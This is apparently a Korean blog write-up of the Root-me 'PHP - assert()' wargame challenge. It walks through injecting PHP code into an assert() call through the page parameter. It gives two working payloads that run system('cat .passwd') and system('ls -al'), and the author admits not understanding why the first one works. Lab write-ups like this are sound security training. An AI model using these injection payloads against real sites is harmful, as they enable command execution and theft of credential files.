---
title : Root-me PHP assert()
date: 2022-06-18-21:41 +0900
categories : [Wargame, Root-me]
tags : [php assert, php assert bypass strpos]
---

## PHP - assert()
<hr style="border-top: 1px solid;"><br>

```
Read the doc!
Author
Birdy42,  26 November 2016

Statement
Find and exploit the vulnerability to read the file .passwd.
```

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Solution
<hr style="border-top: 1px solid;"><br>

home, about 등의 페이지에 접속하면 파라미터로 ```?page=home``` 처럼 값을 받는다.

값으로 ```../```을 주니 아래와 같이 assertion이 출력됬다.
: ```Warning: assert(): Assertion "strpos('includes/../.php', '..') === false" failed in /challenge/web-serveur/ch47/index.php on line 8 Detected hacking attempt!```

<br>

Bypass LFI checks and strpos() check in assert
: <a href="https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6" target="_blank">infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6</a>

<br>

위의 블로그에서 설명해준 것 처럼  ```' and die(system('ls'))or '```을 통해 우회할 수 있다.

우선 입력 값으로 single quote를 입력해주면 에러가 뜨는데 이는 **즉, assert 문에 코드를 주입할 수 있다는 뜻**이다.

코드는 아마 ```assert(strpos('includes/$_GET["page"]'.php', '..') === false) or die('Detected hacking attempt!');```로 되어 있을 것이다.

따라서 ```' and die(system('cat .passwd')) or '```를 해주면 ```assert(strpos('includes/' and die(system('cat .passwd')) or ''.php', '..') === false) or die('Detected hacking attempt!');```이 되는데 솔직히 이거는 왜 되는지 모르겠다.

다른 payload로는 ```','.') === true or die(system('ls -al')) or strpos('```가 있고 이 코드를 주입하면 된다.

따라서 코드가 ```assert(strpos('includes/','.') === true or die(system('ls -al')) or strpos(''.php', '..') === false) or die('Detected hacking attempt!');```가 되어 assert문이 변조가 된다.

<br><br>
<hr style="border: 2px solid;">
<br><br>
